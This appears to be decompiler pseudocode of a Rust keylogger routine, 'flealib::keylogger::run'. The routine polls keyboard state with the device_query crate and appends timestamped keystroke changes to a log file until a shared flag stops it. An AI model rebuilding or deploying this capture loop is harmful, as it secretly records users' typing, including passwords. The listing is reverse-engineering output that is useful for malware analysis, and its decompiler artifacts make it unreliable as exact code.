fn flealib::keylogger::run(a0: i64, a1: u64) -> int {
    let v0: Result<struct4, struct8>;  // [bp-0x12c]
    let v1: u128;  // [bp-0x128]
    let v2: alloc::borrow::Cow<str>;  // [bp-0x128]
    let v3: struct24;  // [bp-0x120]
    let v4: u64;  // [bp-0x118]
    let v5: core::result::Result<usize, std::io::error::Error>;  // [bp-0x108]
    let v6: struct24;  // [bp-0x100]
    let v7: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0xf8], Other Possible Types: struct33
    let v8: core::fmt::Arguments;  // [bp-0xf8]
    let v9: u64;  // [bp-0xf8]
    let v10: u32;  // [bp-0xf0]
    let v11: u8;  // [bp-0xee]
    let v12: u8;  // [bp-0xec]
    let v13: u64;  // [bp-0xe8]
    let v14: core::fmt::rt::Argument;  // [bp-0xc8], Other Possible Types: core::result::Result<std::fs::File, std::io::error::Error>, struct24
    let v15: struct88;  // [bp-0xc8]
    let v16: core::result::Result<std::fs::File, std::io::error::Error>;  // [bp-0xb0]
    let v17: struct60;  // [bp-0xa8], Other Possible Types: u128
    let v19: u128;  // [bp-0xa8]
    let v20: Result<struct4, struct8>;  // [bp-0x98], Other Possible Types: struct42
    let v21: core::fmt::rt::Argument;  // [bp-0x50]
    let v22: struct88;  // [bp-0x50]
    let v23: struct16;  // [bp-0x40]
    let v25: u64;  // rcx
    let v27: u32;  // rdx
    let v29: i64;  // rax

    v5 = a1;
    v16 = a0;
    v6 = device_query::device_state::linux::DeviceState::new();
    v2 = 0;
    v3 = 1;
    v4 = 0;
    v7 = 0x1b600000000;
    v12 = 0;
    v10 = 0;
    v12 = 1;
    v11 = 1;
    v20 = *((a0 + 16) as &i64);
    v17 = *(a0 as &i128);
    v14 = std::fs::OpenOptions::open(&v7, &v17, v25);
    v0 = core::result::Result<T,E>::expect(&v14);
    v23 = chrono::offset::local::Local::now();
    v7 = struct33 {
        field_0: "%Y-%m-%d %H:%M:%S"
        field_16: ""
        field_32: 0
    };
    v17 = chrono::datetime::DateTime<Tz>::format_with_items(&v23, &v7);
    v14 = <T as alloc::string::SpecToString>::spec_to_string(&v17);
    v21 = core::fmt::rt::Argument {
        ty: &v14
    };
    v8 = core::fmt::Arguments {
        pieces: ["[", "]\n"]
        args: [v22]
        fmt: 0
    };
    core::result::Result<T,E>::expect(std::io::Write::write_fmt(&v0, &v8), "flealib/src/keylogger.rs");
    loop {
        <device_query::device_state::linux::DeviceState as device_query::device_query::DeviceQuery>::get_keys(&v9, &v6);
        if !<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v8.pieces.len, v13, <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(1, v4), v27) && v13 {
            v14 = core::fmt::rt::Argument {
                ty: &v9
            };
            v19 = core::fmt::Arguments {
                pieces: [&g_44fb30]
                args: [v15]
                fmt: 0
            };
            core::result::Result<T,E>::expect(std::io::Write::write_fmt(&v0, &v19), "flealib/src/keylogger.rs");
        }
        v20 = v13;
        v19 = *(&v9 as &i128);
        v4 = v20;
        v1 = v19;
        std::sync::mutex::Mutex<T>::lock(&v19, v5 + 16);
        v29 = core::result::Result<T,E>::unwrap(&v19);
        if *((v29 + 5) as &i8) {
            break;
        }
        std::thread::sleep(None, &g_989680);
    }
    return;
}
